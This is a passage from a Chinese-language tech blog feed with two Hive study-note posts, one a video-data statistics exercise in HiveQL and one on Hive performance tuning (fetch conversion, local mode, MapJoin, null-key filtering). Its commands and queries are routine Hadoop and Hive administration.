punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）将ETL程序打包为etl.jar 并上传到Linux的 /opt/module/hive/datas 目录下</p><p>5）上传原始数据到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> <span class="token function">pwd</span>/opt/module/hive/datas<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -mkdir -p /gulivideo/video<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -mkdir -p /gulivideo/user<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -put gulivideo/user/user.txt  /gulivideo/user<span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop fs -put gulivideo/video/*.txt  /gulivideo/video<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6）ETL数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span> hadoop jar  etl.jar  com.molly.hive.etl.EtlDriver /gulivideo/video /gulivideo/video/output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-准备表"><a href="#3-2-准备表" class="headerlink" title="3.2 准备表"></a>3.2 准备表</h3><p>1）需要准备的表</p><p><strong>因为我们想要创建压缩表，但是压缩表不能直接导入数据，因此我们采用两个中转表（原始表），然后从原始表导入压缩表（最终表）。</strong></p><p>创建原始数据表：gulivideo_ori，gulivideo_user_ori，</p><p>创建最终表：gulivideo_orc，gulivideo_user_orc</p><p>2）创建原始数据表：</p><p>  （1）gulivideo_ori</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_ori<span class="token punctuation">(</span>  videoId string,   uploader string,   age int,   category array<span class="token operator">&lt;</span>string<span class="token operator">></span>,   length int,   views int,   rate float,   ratings int,   comments int,  relatedId array<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">"\t"</span>collection items terminated by <span class="token string">"&amp;"</span>stored as textfile<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）创建原始数据表: gulivideo_user_ori</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_user_ori<span class="token punctuation">(</span>  uploader string,  videos int,  friends int<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">"\t"</span> stored as textfile<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1） 创建orc存储格式带snappy压缩的表：</p><p>（1）gulivideo_orc</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_orc<span class="token punctuation">(</span>  videoId string,   uploader string,   age int,   category array<span class="token operator">&lt;</span>string<span class="token operator">></span>,   length int,   views int,   rate float,   ratings int,   comments int,  relatedId array<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">)</span>stored as orctblproperties<span class="token punctuation">(</span><span class="token string">"orc.compress"</span><span class="token operator">=</span><span class="token string">"SNAPPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）gulivideo_user_orc</p><pre class="line-numbers language-bash"><code class="language-bash">create table gulivideo_user_orc<span class="token punctuation">(</span>  uploader string,  videos int,  friends int<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">"\t"</span> stored as orctblproperties<span class="token punctuation">(</span><span class="token string">"orc.compress"</span><span class="token operator">=</span><span class="token string">"SNAPPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）向ori表插入数据</p><pre class="line-numbers language-bash"><code class="language-bash">load data inpath <span class="token string">"/gulivideo/video/output"</span> into table gulivideo_ori<span class="token punctuation">;</span>load data inpath <span class="token string">"/gulivideo/user"</span> into table gulivideo_user_ori<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）向orc表插入数据</p><pre class="line-numbers language-bash"><code class="language-bash">insert into table gulivideo_orc <span class="token keyword">select</span> * from gulivideo_ori<span class="token punctuation">;</span>insert into table gulivideo_user_orc <span class="token keyword">select</span> * from gulivideo_user_ori<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-业务分析"><a href="#4-业务分析" class="headerlink" title="4 业务分析"></a>4 业务分析</h2><h3 id="4-1-统计视频观看数Top10"><a href="#4-1-统计视频观看数Top10" class="headerlink" title="4.1 统计视频观看数Top10"></a>4.1 统计视频观看数Top10</h3><p>思路：使用order by按照views字段做一个全局排序即可，同时我们设置只显示前10条。</p><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT videoId,views FROM gulivideo_orcORDER BY views DESC LIMIT 10<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-统计视频类别热度Top10"><a href="#4-2-统计视频类别热度Top10" class="headerlink" title="4.2 统计视频类别热度Top10"></a>4.2 统计视频类别热度Top10</h3><p>思路：</p><p>（1）即统计每个类别有多少个视频，显示出包含视频最多的前10个类别。</p><p>（2）我们需要按照类别group by聚合，然后count组内的videoId个数即可。</p><p>（3）因为当前表结构为：一个视频对应一个或多个类别。所以如果要group by类别，需要先将类别进行列转行(展开)，然后再进行count即可。</p><p>（4）最后按照热度排序，显示前10条。</p><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT   t1.category_name , COUNT<span class="token punctuation">(</span>t1.videoId<span class="token punctuation">)</span> hotFROM <span class="token punctuation">(</span>SELECT videoId, category_name FROM gulivideo_orc lateral VIEW explode<span class="token punctuation">(</span>category<span class="token punctuation">)</span> gulivideo_orc_tmp AS category_name<span class="token punctuation">)</span> t1GROUP BY t1.category_name ORDER BY hot DESC LIMIT 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数"><a href="#4-3-统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数" class="headerlink" title="4.3 统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数"></a>4.3 统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数</h3><p>思路：</p><p>（1）先找到观看数最高的20个视频所属条目的所有信息，降序排列</p><p>（2）把这20条信息中的category分裂出来(列转行)</p><p>（3）最后查询视频分类名称和该分类下有多少个Top20的视频</p><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT  t2.category_name, COUNT<span class="token punctuation">(</span>t2.videoId<span class="token punctuation">)</span> video_sum FROM  <span class="token punctuation">(</span> SELECT  t1.videoId,  category_name FROM  <span class="token punctuation">(</span> SELECT  videoId,  views , category  FROM  gulivideo_orc ORDER BY  views  DESC  LIMIT 20 <span class="token punctuation">)</span> t1lateral VIEW explode<span class="token punctuation">(</span>t1.category<span class="token punctuation">)</span> t1_tmp AS category_name<span class="token punctuation">)</span> t2GROUP BY t2.category_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-4-统计视频观看数Top50所关联视频的所属类别排序"><a href="#4-4-统计视频观看数Top50所关联视频的所属类别排序" class="headerlink" title="4.4 统计视频观看数Top50所关联视频的所属类别排序"></a>4.4 统计视频观看数Top50所关联视频的所属类别排序</h3><p>代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT t6.category_name, t6.video_sum, rank<span class="token punctuation">(</span><span class="token punctuation">)</span> over<span class="token punctuation">(</span>ORDER BY t6.video_sum DESC <span class="token punctuation">)</span> rkFROM <span class="token punctuation">(</span> SELECT t5.category_name, COUNT<span class="token punctuation">(</span>t5.relatedid_id<span class="token punctuation">)</span> video_sum FROM <span class="token punctuation">(</span> SELECT t4.relatedid_id, category_name FROM <span class="token punctuation">(</span> SELECT   t2.relatedid_id , t3.category   FROM  <span class="token punctuation">(</span> SELECT   relatedid_id FROM  <span class="token punctuation">(</span> SELECT  videoId,   views, relatedid  FROM  gulivideo_orc ORDER BY views  DESC  LIMIT 50 <span class="token punctuation">)</span>t1 lateral VIEW explode<span class="token punctuation">(</span>t1.relatedid<span class="token punctuation">)</span> t1_tmp AS relatedid_id <span class="token punctuation">)</span>t2  JOIN   gulivideo_orc t3  ON   t2.relatedid_id <span class="token operator">=</span> t3.videoId <span class="token punctuation">)</span> t4 lateral VIEW explode<span class="token punctuation">(</span>t4.category<span class="token punctuation">)</span> t4_tmp AS category_name<span class="token punctuation">)</span> t5GROUP BY t5.category_nameORDER BY  video_sum DESC <span class="token punctuation">)</span> t6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-统计每个类别中的视频热度Top10，以Music为例"><a href="#4-5-统计每个类别中的视频热度Top10，以Music为例" class="headerlink" title="4.5 统计每个类别中的视频热度Top10，以Music为例"></a>4.5 统计每个类别中的视频热度Top10，以Music为例</h3><p>思路：</p><p>（1）要想统计Music类别中的视频热度Top10，需要先找到Music类别，那么就需要将category展开，所以可以创建一张表用于存放categoryId展开的数据。</p><p>（2）向category展开的表中插入数据。</p><p>（3）统计对应类别（Music）中的视频热度。</p><p>统计Music类别的Top10（也可以统计其他）</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT t1.videoId,  t1.views, t1.category_name FROM  <span class="token punctuation">(</span> SELECT  videoId, views, category_name FROM gulivideo_orc lateral VIEW explode<span class="token punctuation">(</span>category<span class="token punctuation">)</span> gulivideo_orc_tmp AS category_name <span class="token punctuation">)</span>t1   WHERE   t1.category_name <span class="token operator">=</span> <span class="token string">"Music"</span>  ORDER BY   t1.views DESC LIMIT 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-6-统计每个类别视频观看数Top10"><a href="#4-6-统计每个类别视频观看数Top10" class="headerlink" title="4.6 统计每个类别视频观看数Top10"></a>4.6 统计每个类别视频观看数Top10</h3><p>最终代码：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT   t2.videoId, t2.views,  t2.category_name,  t2.rkFROM <span class="token punctuation">(</span>SELECT  t1.videoId,  t1.views, t1.category_name,rank<span class="token punctuation">(</span><span class="token punctuation">)</span> over<span class="token punctuation">(</span>PARTITION BY t1.category_name ORDER BY t1.views DESC <span class="token punctuation">)</span> rkFROM  <span class="token punctuation">(</span>SELECT videoId, views,  category_nameFROM gulivideo_orclateral VIEW explode<span class="token punctuation">(</span>category<span class="token punctuation">)</span> gulivideo_orc_tmp AS category_name<span class="token punctuation">)</span>t1<span class="token punctuation">)</span>t2WHERE t2.rk <span class="token operator">&lt;=</span>10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-7-统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频"><a href="#4-7-统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频" class="headerlink" title="4.7 统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频"></a>4.7 统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频</h3><p>思路：</p><p>（1）求出上传视频最多的10个用户</p><p>（2）关联gulivideo_orc表，求出这10个用户上传的所有的视频，按照观看数取前20</p><p>最终代码:</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT  t2.videoId,  t2.views,  t2.uploaderFROM<span class="token punctuation">(</span> SELECT  uploader, videos FROM gulivideo_user_orc  ORDER BY  videos DESC LIMIT 10   <span class="token punctuation">)</span> t1 JOIN gulivideo_orc t2  ON t1.uploader <span class="token operator">=</span> t2.uploader ORDER BY   t2.views  DESC LIMIT 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive5-example/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（四） Hive的企业级调优</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive4-optimize/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive4-optimize/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>对于Hive的操作是面对大数据层面，因此对于查询效率是有要求的，这篇主要从以下几个方面进行调优。</p><p>总结:优化：<br>1 设置抓取为more:set hive.fetch.task.conversion=more;<br>2 开启本地模式:配置小数据量放到本地跑<br>set hive.exec.mode.local.auto=true;  //开启本地mr<br>//设置local mr的最大输入数据量，当输入数据量小于这个值时采用local  mr的方式，默认为134217728，即128M<br>set hive.exec.mode.local.auto.inputbytes.max=50000000;<br>//设置local mr的最大输入文件个数，当输入文件个数小于这个值时采用local mr的方式，默认为4<br>set hive.exec.mode.local.auto.input.files.max=10;</p><h1 id="1-执行计划（Explain）"><a href="#1-执行计划（Explain）" class="headerlink" title="1 执行计划（Explain）"></a>1 执行计划（Explain）</h1><p>explain很详细的看到语句执行过程中发生的事情。</p><h2 id="1-1基本语法"><a href="#1-1基本语法" class="headerlink" title="1.1基本语法"></a>1.1基本语法</h2><p>EXPLAIN [EXTENDED | DEPENDENCY | AUTHORIZATION] query</p><p>Explain主要是分析一下sql的执行过程。</p><h2 id="1-2-案例实操"><a href="#1-2-案例实操" class="headerlink" title="1.2 案例实操"></a>1.2 案例实操</h2><p>（1）查看下面这条语句的执行计划</p><p>没有生成MR任务的</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有生成MR任务的</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain <span class="token keyword">select</span> deptno, avg<span class="token punctuation">(</span>sal<span class="token punctuation">)</span> avg_sal from emp group by deptno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查看详细执行计划</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain extended <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> explain extended <span class="token keyword">select</span> deptno, avg<span class="token punctuation">(</span>sal<span class="token punctuation">)</span> avg_sal from emp group by deptno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-Fetch抓取"><a href="#2-Fetch抓取" class="headerlink" title="2 Fetch抓取"></a>2 Fetch抓取</h1><p>Fetch抓取是指，Hive中对某些情况的查询可以不必使用MapReduce计算。例如：SELECT * FROM employees;在这种情况下，Hive可以简单地读取employee对应的存储目录下的文件，然后输出查询结果到控制台。</p><p>在hive-default.xml.template文件中hive.fetch.task.conversion默认是more，老版本hive默认是minimal，该属性修改为more以后，在全局查找、字段查找、limit查找等都不走mapreduce。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>property<span class="token operator">></span>  <span class="token operator">&lt;</span>name<span class="token operator">></span>hive.fetch.task.conversion<span class="token operator">&lt;</span>/name<span class="token operator">></span>  <span class="token operator">&lt;</span>value<span class="token operator">></span>more<span class="token operator">&lt;</span>/value<span class="token operator">></span>  <span class="token operator">&lt;</span>description<span class="token operator">></span>   Expects one of <span class="token punctuation">[</span>none, minimal, more<span class="token punctuation">]</span>.   Some <span class="token keyword">select</span> queries can be converted to single FETCH task minimizing latency.   Currently the query should be single sourced not having any subquery and should not have any aggregations or distincts <span class="token punctuation">(</span>which incurs RS<span class="token punctuation">)</span>, lateral views and joins.   \0. none <span class="token keyword">:</span> disable hive.fetch.task.conversion   \1. minimal <span class="token keyword">:</span> SELECT STAR, FILTER on partition columns, LIMIT only   \2. <span class="token function">more</span> <span class="token keyword">:</span> SELECT, FILTER, LIMIT only <span class="token punctuation">(</span>support TABLESAMPLE and virtual columns<span class="token punctuation">)</span>  <span class="token operator">&lt;</span>/description<span class="token operator">></span><span class="token operator">&lt;</span>/property<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-1-案例实操："><a href="#2-1-案例实操：" class="headerlink" title="2.1 案例实操："></a>2.1 案例实操：</h2><p>（1）把hive.fetch.task.conversion设置成none，然后执行查询语句，都会执行mapreduce程序。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.fetch.task.conversion<span class="token operator">=</span>none<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> ename from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> ename from emp limit 3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（2）把hive.fetch.task.conversion设置成more，然后执行查询语句，如下查询方式都不会执行mapreduce程序。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.fetch.task.conversion<span class="token operator">=</span>more<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> ename from emp<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> ename from emp limit 3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-本地模式"><a href="#3-本地模式" class="headerlink" title="3 本地模式"></a>3 本地模式</h1><p>大多数的Hadoop Job是需要Hadoop提供的完整的可扩展性来处理大数据集的。不过，有时Hive的输入数据量是非常小的。在这种情况下，为查询触发执行任务消耗的时间可能会比实际job的执行时间要多的多。对于大多数这种情况，Hive可以通过本地模式在单台机器上处理所有的任务。对于小数据集，执行时间可以明显被缩短。</p><p>用户可以通过设置hive.exec.mode.local.auto的值为true，来让Hive在适当的时候自动启动这个优化。</p><p>set hive.exec.mode.local.auto=true; //开启本地mr</p><p>//设置local mr的最大输入数据量，当输入数据量小于这个值时采用local mr的方式，默认为134217728，即128M</p><p>set hive.exec.mode.local.auto.inputbytes.max=50000000;</p><p>//设置local mr的最大输入文件个数，当输入文件个数小于这个值时采用local mr的方式，默认为4</p><p>set hive.exec.mode.local.auto.input.files.max=10;</p><h2 id="3-1-案例实操："><a href="#3-1-案例实操：" class="headerlink" title="3.1 案例实操："></a>3.1 案例实操：</h2><p>（1）开启本地模式，并执行查询语句</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.mode.local.auto<span class="token operator">=</span>true<span class="token punctuation">;</span> hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp cluster by deptno<span class="token punctuation">;</span>Time taken: 1.328 seconds, Fetched: 14 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）关闭本地模式，并执行查询语句</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.mode.local.auto<span class="token operator">=</span>false<span class="token punctuation">;</span> hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp cluster by deptno<span class="token punctuation">;</span>Time taken: 20.09 seconds, Fetched: 14 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="4-表的优化"><a href="#4-表的优化" class="headerlink" title="4 表的优化"></a>4 表的优化</h1><h2 id="4-1-小表大表Join-MapJoin"><a href="#4-1-小表大表Join-MapJoin" class="headerlink" title="4.1 小表大表Join(MapJoin)"></a>4.1 小表大表Join(MapJoin)</h2><p>将key相对分散，并且数据量小的表放在join的左边，这样可以有效减少内存溢出错误发生的几率；再进一步，可以使用map join让小的维度表（1000条以下的记录条数）先进内存。在map端完成join。</p><p>实际测试发现：新版的hive已经对小表JOIN大表和大表JOIN小表进行了优化。小表放在左边和右边已经没有明显区别。</p><p>案例实操</p><p>1）需求</p><p>测试大表JOIN小表和小表JOIN大表的效率</p><p>2）开启MapJoin参数设置</p><p>（1）设置自动选择Mapjoin</p><p>set hive.auto.convert.join = true; 默认为true</p><p>（2）大表小表的阈值设置（默认25M以下认为是小表）：</p><p>set hive.mapjoin.smalltable.filesize = 25000000;</p><p>3）MapJoin工作机制</p><p>​                         <img src="/2020/11/15/bigdata-hive4-optimize/1637047033227.png" alt="1637047033227">       </p><p>4）建大表、小表和JOIN后表的语句</p><pre class="line-numbers language-bash"><code class="language-bash">// 创建大表create table bigtable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span> // 创建小表create table smalltable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>// 创建join后表的语句create table jointable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）分别向大表和小表中导入数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/bigtable'</span> into table bigtable<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>load data local inpath <span class="token string">'/opt/module/hive/datas/smalltable'</span> into table smalltable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）小表JOIN大表语句</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom smalltable s<span class="token function">join</span> bigtable bon b.id <span class="token operator">=</span> s.id<span class="token punctuation">;</span>Time taken: 35.921 secondsNo rows affected <span class="token punctuation">(</span>44.456 seconds<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7）执行大表JOIN小表语句</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom bigtable b<span class="token function">join</span> smalltable son s.id <span class="token operator">=</span> b.id<span class="token punctuation">;</span>Time taken: 34.196 secondsNo rows affected <span class="token punctuation">(</span>26.287 seconds<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-2-大表Join大表"><a href="#4-2-大表Join大表" class="headerlink" title="4.2 大表Join大表"></a>4.2 大表Join大表</h2><h3 id="4-2-1-空KEY过滤"><a href="#4-2-1-空KEY过滤" class="headerlink" title="4.2.1 空KEY过滤"></a>4.2.1 空KEY过滤</h3><p>有时join超时是因为某些key对应的数据太多，而相同key对应的数据都会发送到相同的reducer上，从而导致内存不够。此时我们应该仔细分析这些异常的key，很多情况下，这些key对应的数据是异常数据，我们需要在SQL语句中进行过滤。例如key对应的字段为空，操作如下：</p><p>案例实操</p><p>（1）配置历史服务器</p><p>配置mapred-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>property<span class="token operator">></span><span class="token operator">&lt;</span>name<span class="token operator">></span>mapreduce.jobhistory.address<span class="token operator">&lt;</span>/name<span class="token operator">></span><span class="token operator">&lt;</span>value<span class="token operator">></span>hadoop102:10020<span class="token operator">&lt;</span>/value<span class="token operator">></span><span class="token operator">&lt;</span>/property<span class="token operator">></span><span class="token operator">&lt;</span>property<span class="token operator">></span>  <span class="token operator">&lt;</span>name<span class="token operator">></span>mapreduce.jobhistory.webapp.address<span class="token operator">&lt;</span>/name<span class="token operator">></span>  <span class="token operator">&lt;</span>value<span class="token operator">></span>hadoop102:19888<span class="token operator">&lt;</span>/value<span class="token operator">></span><span class="token operator">&lt;</span>/property<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动历史服务器</p><pre class="line-numbers language-bash"><code class="language-bash">sbin/mr-jobhistory-daemon.sh start historyserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看jobhistory</p><p><a href="http://hadoop102:19888/jobhistory">http://hadoop102:19888/jobhistory</a></p><p>（2）创建原始数据表、空id表、合并后数据表</p><p>// 创建空id表</p><pre class="line-numbers language-bash"><code class="language-bash">create table nullidtable<span class="token punctuation">(</span>id bigint, t bigint, uid string, keyword string, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）分别加载原始数据和空id数据到对应表中</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/nullid'</span> into table nullidtable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）测试不过滤空id</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite table jointable <span class="token keyword">select</span> n.* from nullidtable nleft <span class="token function">join</span> bigtable o on n.id <span class="token operator">=</span> o.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（5）测试过滤空id</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite table jointable <span class="token keyword">select</span> n.* from <span class="token punctuation">(</span>select * from nullidtable where <span class="token function">id</span> is not null <span class="token punctuation">)</span> n left <span class="token function">join</span> bigtable o on n.id <span class="token operator">=</span> o.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-2-空key转换"><a href="#4-2-2-空key转换" 